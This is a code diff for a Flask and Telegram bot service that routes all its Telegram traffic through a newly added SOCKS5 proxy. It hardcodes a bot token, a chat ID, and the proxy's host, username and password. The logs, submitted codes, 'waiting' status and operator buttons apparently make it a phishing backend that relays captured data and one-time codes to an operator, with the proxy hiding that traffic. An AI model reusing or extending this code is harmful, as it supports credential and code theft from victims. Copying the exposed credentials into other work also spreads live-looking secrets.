@@ -13,6 +13,7 @@ from flask import Flask, request, jsonify
 from flask_cors import CORS
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
+from telegram.request import HTTPXRequest
 import threading
 import asyncio
 
@@ -22,6 +23,13 @@ import asyncio
 BOT_TOKEN = '7618907339:AAEGt7Xr-ZgC4vniSfPCARhO98Bfm1qVFTo'
 CHAT_ID = '7888080337'
 API_PORT = 5000
+
+# SOCKS5 Прокси
+PROXY_HOST = '45.91.239.242'
+PROXY_PORT = 64713
+PROXY_USER = 'GXjt8nK3'
+PROXY_PASS = 'ghhPdd4C'
+PROXY_URL = f'socks5://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}'
 # ============================================
 
 # Логирование
@@ -288,7 +296,8 @@ def create_log():
 
 async def send_log_to_telegram(log_data):
     """Отправка лога в Telegram"""
-    application = Application.builder().token(BOT_TOKEN).build()
+    request = HTTPXRequest(proxy=PROXY_URL)
+    application = Application.builder().token(BOT_TOKEN).request(request).build()
     
     text = format_log_message(log_data, 'waiting')
     keyboard = get_keyboard(log_data['id'], 'waiting')
@@ -335,7 +344,8 @@ def submit_code(log_id):
 
 async def send_code_to_telegram(log_data, code):
     """Отправка кода в Telegram"""
-    application = Application.builder().token(BOT_TOKEN).build()
+    request = HTTPXRequest(proxy=PROXY_URL)
+    application = Application.builder().token(BOT_TOKEN).request(request).build()
     
     async with application:
         await application.bot.send_message(
@@ -359,7 +369,8 @@ def run_flask():
 
 def run_bot():
     """Запуск Telegram бота"""
-    application = Application.builder().token(BOT_TOKEN).build()
+    request = HTTPXRequest(proxy=PROXY_URL)
+    application = Application.builder().token(BOT_TOKEN).request(request).build()
     
     application.add_handler(CommandHandler('start', start))
     application.add_handler(CallbackQueryHandler(button_callback))
